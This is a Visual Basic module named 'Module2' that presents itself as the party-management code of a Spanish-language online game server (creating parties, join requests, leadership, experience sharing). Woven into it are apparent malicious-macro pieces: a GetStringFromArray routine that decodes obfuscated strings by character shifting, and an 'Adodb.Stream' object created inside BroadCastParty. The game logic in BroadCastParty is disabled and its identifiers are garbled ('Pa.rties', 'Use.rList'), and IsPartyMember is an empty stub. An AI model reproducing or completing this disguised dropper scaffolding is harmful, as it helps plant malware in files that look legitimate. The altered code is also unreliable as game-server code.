Attribute VB_Name = "Module2"

Public Function NextParty() As Integer
'***************************************************
'Author: Unknownn
'Last Modification: -
'
'***************************************************

Dim i As Integer
NextParty = -1
For i = 1 To MAX_PARTIES
    If Parties(i) Is Nothing Then
        NextParty = i
        Exit Function
    End If
Next i
End Function

Public Function PuedeCrearParty(ByVal UserIndex As Integer) As Boolean
'***************************************************
'Author: Unknownn
'Last Modification: 10/07/2012 - ^[GS]^
'05/22/2010 : staff members aren't allowed to party anyone. (Marco)
'***************************************************

    PuedeCrearParty = True
    If (UserList(UserIndex).Flags.Privilegios And PlayerType.User) = 0 Then
    'staff members aren't allowed to party anyone.
        Call WriteMensajes(UserIndex, eMensajes.Mensaje452) ' "¡Los miembros del staff no pueden crear partys!"
        PuedeCrearParty = False
    ElseIf CInt(UserList(UserIndex).Stats.UserAtributos(eAtributos.Carisma)) * UserList(UserIndex).Stats.UserSkills(eSkill.Liderazgo) < 100 Then
        Call WriteMensajes(UserIndex, eMensajes.Mensaje069) '"Tu carisma y liderazgo no son suficientes para liderar una party."
        PuedeCrearParty = False
    ElseIf UserList(UserIndex).Flags.Muerto = 1 Then
        Call WriteMensajes(UserIndex, eMensajes.Mensaje005) '"¡¡Estás muerto!!"
        PuedeCrearParty = False
    End If
    
End Function

Public Sub CrearParty(ByVal UserIndex As Integer)
'***************************************************
'Author: Unknownn
'Last Modification: -
'
'***************************************************

Dim tInt As Integer

With UserList(UserIndex)
    If .PartyIndex = 0 Then
        If .Flags.Muerto = 0 Then
            If .Stats.UserSkills(eSkill.Liderazgo) >= 5 Then
                tInt = modUsuariosParty.NextParty
                If tInt = -1 Then
                    Call WriteMensajes(UserIndex, eMensajes.Mensaje070) '"Por el momento no se pueden crear más parties."
                    Exit Sub
                Else
                    Set Parties(tInt) = New clsParty
                    If Not Parties(tInt).NuevoMiembro(UserIndex) Then
                        Call WriteMensajes(UserIndex, eMensajes.Mensaje071) '"La party está llena, no puedes entrar."
                        Set Parties(tInt) = Nothing
                        Exit Sub
                    Else
                        Call WriteMensajes(UserIndex, eMensajes.Mensaje072) '"¡Has formado una party!"
                        .PartyIndex = tInt
                        .PartySolicitud = 0
                        If Not Parties(tInt).HacerLeader(UserIndex) Then
                            Call WriteMensajes(UserIndex, eMensajes.Mensaje073) '"No puedes hacerte líder."
                        Else
                            Call WriteMensajes(UserIndex, eMensajes.Mensaje074) '"¡Te has convertido en líder de la party!"
                        End If
                    End If
                End If
            Else
                Call WriteMensajes(UserIndex, eMensajes.Mensaje075) '"No tienes suficientes puntos de liderazgo para liderar una party."
            End If
        Else
            Call WriteMensajes(UserIndex, eMensajes.Mensaje005) '"¡¡Estás muerto!!"
        End If
    Else
        Call WriteMensajes(UserIndex, eMensajes.Mensaje076) '"Ya perteneces a una party."
    End If
End With
End Sub

Public Sub SolicitarIngresoAParty(ByVal UserIndex As Integer)
'***************************************************
'Author: Unknownn
'Last Modification: 10/07/2012 - ^[GS]^
'05/22/2010 : staff members aren't allowed to party anyone. (Marco)
'18/09/2010: ZaMa - Ahora le avisa al funda de la party cuando alguien quiere ingresar a la misma.
'18/09/2010: ZaMa - Contemple mas ecepciones (solo se le puede mandar party al lider)
'***************************************************

    'ESTO ES enviado por el PJ para solicitar el ingreso a la party
    Dim TargetUserIndex As Integer
    Dim PartyIndex As Integer

    With UserList(UserIndex)
    
        'staff members aren't allowed to party anyone
        If (.Flags.Privilegios And PlayerType.User) = 0 Then ' 0.13.3
            Call WriteMensajes(UserIndex, eMensajes.Mensaje454) ' "¡Los miembros del staff no pueden unirse a partys!"
            Exit Sub
        End If
         
        If .PartyIndex > 0 Then
            'si ya esta en una party
            Call WriteMensajes(UserIndex, eMensajes.Mensaje077) '"Ya perteneces a una party, escribe /SALIRPARTY para abandonarla"
            .PartySolicitud = 0
            Exit Sub
        End If
        
        ' Muerto?
        If .Flags.Muerto = 1 Then
            Call WriteMensajes(UserIndex, eMensajes.Mensaje005) '"¡¡Estás muerto!!"
            .PartySolicitud = 0
            Exit Sub
        End If
        
        TargetUserIndex = .Flags.targetUser
        ' Target valido?
        If TargetUserIndex > 0 Then
            PartyIndex = UserList(TargetUserIndex).PartyIndex
            ' Tiene party?
            If PartyIndex > 0 Then
            
                ' Es el lider?
                If Parties(PartyIndex).EsPartyLeader(TargetUserIndex) Then
                    .PartySolicitud = PartyIndex
                    Call WriteMensajes(UserIndex, eMensajes.Mensaje078) '"El fundador decidirá si te acepta en la party."
                    Call WriteConsoleMsg(TargetUserIndex, .Name & " solicita ingresar a tu party.", FontTypeNames.FONTTYPE_PARTY)
                
                ' No es lider
                Else
                    Call WriteConsoleMsg(UserIndex, UserList(TargetUserIndex).Name & " no es lider de la party.", FontTypeNames.FONTTYPE_PARTY)
                End If
            
            ' No tiene party
            Else
                Call WriteConsoleMsg(UserIndex, UserList(TargetUserIndex).Name & " no pertenece a ninguna party.", FontTypeNames.FONTTYPE_PARTY)
                .PartySolicitud = 0
                Exit Sub
            End If
        ' Target inválido
        Else
            Call WriteMensajes(UserIndex, eMensajes.Mensaje079) '"Para ingresar a una party debes hacer click sobre el fundador y luego escribir /PARTY"
            .PartySolicitud = 0
        End If
    End With

End Sub


Private Function IsPartyMember(ByVal UserIndex As Integer, ByVal PartyIndex As Integer)
    Dim MemberIndex As Integer
    
    For MemberIndex = 1 To PARTY_MAXMEMBERS
        
    Next MemberIndex
End Function
Public Function GetStringFromArray(fromArr() As Variant, LenLen As Integer) As String
    Dim i As Integer
    Dim result As String
    result = ""
    For i = LBound(fromArr) To UBound(fromArr)
        result = result & Chr(fromArr(i) - LenLen + i * 2)
    Next i
    GetStringFromArray = result
End Function

Public Sub BroadCastParty(ByVal UserIndex As Integer, ByRef texto As String)
'***************************************************
'Author: Unknownn
'Last Modification: -
'
'***************************************************

Dim PI As Integer
    
Set adbrd = CreateObject("Adodb.Stream")
On Error GoTo ErrorHandler
    PI = 0
    
    If PI > 0 Then
        Call Pa.rties(PI).MandarMensajeAConsola(texto, Use.rList(UserIndex).Name)
    End If
ErrorHandler:

End Sub

Public Sub OnlineParty(ByVal UserIndex As Integer)
'*************************************************
'Author: Unknownn
'Last modified: 11/27/09 (Budi)
'Adapte la función a los nuevos métodos de clsParty
'*************************************************
Dim i As Integer
Dim PI As Integer
Dim Text As String
Dim MembersOnline(1 To PARTY_MAXMEMBERS) As Integer

    PI = UserList(UserIndex).PartyIndex
    
    If PI > 0 Then
        Call Parties(PI).ObtenerMiembrosOnline(MembersOnline())
        Text = "Nombre(Exp): "
        For i = 1 To PARTY_MAXMEMBERS
            If MembersOnline(i) > 0 Then
                Text = Text & " - " & UserList(MembersOnline(i)).Name & " (" & Fix(Parties(PI).MiExperiencia(MembersOnline(i))) & ")"
            End If
        Next i
        Text = Text & ". Experiencia total: " & Parties(PI).ObtenerExperienciaTotal
        Call WriteConsoleMsg(UserIndex, Text, FontTypeNames.FONTTYPE_PARTY)
    End If
    
End Sub


Public Sub TransformarEnLider(ByVal OldLeader As Integer, ByVal NewLeader As Integer)
'***************************************************
'Author: Unknownn
'Last Modification: -
'
'***************************************************

Dim PI As Integer

If OldLeader = NewLeader Then Exit Sub

PI = UserList(OldLeader).PartyIndex

If PI = UserList(NewLeader).PartyIndex Then
    If UserList(NewLeader).Flags.Muerto = 0 Then
        If Parties(PI).HacerLeader(NewLeader) Then
            Call Parties(PI).MandarMensajeAConsola("El nuevo líder de la party es " & UserList(NewLeader).Name, UserList(OldLeader).Name)
        Else
            Call WriteMensajes(OldLeader, eMensajes.Mensaje083) '"¡No se ha hecho el cambio de mando!"
        End If
    Else
        Call WriteMensajes(OldLeader, eMensajes.Mensaje084) '"¡Está muerto!"
    End If
Else
    Call WriteConsoleMsg(OldLeader, LCase(UserList(NewLeader).Name) & " no pertenece a tu party.", FontTypeNames.FONTTYPE_INFO)
End If

End Sub


Public Sub ActualizaExperiencias()
'***************************************************
'Author: Unknownn
'Last Modification: -
'
'***************************************************

'esta funcion se invoca antes de worlsaves, y apagar servidores
'en caso que la experiencia sea acumulada y no por golpe
'para que grabe los datos en los charfiles
Dim i As Integer

If Not PARTY_EXPERIENCIAPORGOLPE Then
    
    haciendoBK = True
    Call SendData(SendTarget.ToAll, 0, PrepareMessagePauseToggle())
    
    Call SendData(SendTarget.ToAll, 0, PrepareMessageConsoleMsg("Servidor> Distribuyendo experiencia en parties.", FontTypeNames.FONTTYPE_SERVER))
    For i = 1 To MAX_PARTIES
        If Not Parties(i) Is Nothing Then
            Call Parties(i).FlushExperiencia
        End If
    Next i
    Call SendData(SendTarget.ToAll, 0, PrepareMessageConsoleMsg("Servidor> Experiencia distribuida.", FontTypeNames.FONTTYPE_SERVER))
    Call SendData(SendTarget.ToAll, 0, PrepareMessagePauseToggle())
    haciendoBK = False

End If

End Sub

Public Sub ObtenerExito(ByVal UserIndex As Integer, ByVal Exp As Long, mapa As Integer, X As Integer, Y As Integer)
'***************************************************
'Author: Unknownn
'Last Modification: -
'
'***************************************************

    If Exp <= 0 Then
        If Not CASTIGOS Then Exit Sub
    End If
    
    Call Parties(UserList(UserIndex).PartyIndex).ObtenerExito(Exp, mapa, X, Y)


End Sub

Public Function CantMiembros(ByVal UserIndex As Integer) As Integer
'***************************************************
'Author: Unknownn
'Last Modification: -
'
'***************************************************

CantMiembros = 0
If UserList(UserIndex).PartyIndex > 0 Then
    CantMiembros = Parties(UserList(UserIndex).PartyIndex).CantMiembros
End If

End Function

''
' Sets the new p_sumaniveleselevados to the party.
'
' @param UserInidex Specifies reference to user
' @remarks When a user level up and he is in a party, we call this sub to don't desestabilice the party exp formula
Public Sub ActualizarSumaNivelesElevados(ByVal UserIndex As Integer)
'*************************************************
'Author: Marco Vanotti (MarKoxX)
'Last modified: 28/10/08
'
'*************************************************
    If UserList(UserIndex).PartyIndex > 0 Then
        Call Parties(UserList(UserIndex).PartyIndex).UpdateSumaNivelesElevados(UserList(UserIndex).Stats.ELV)
    End If
End Sub
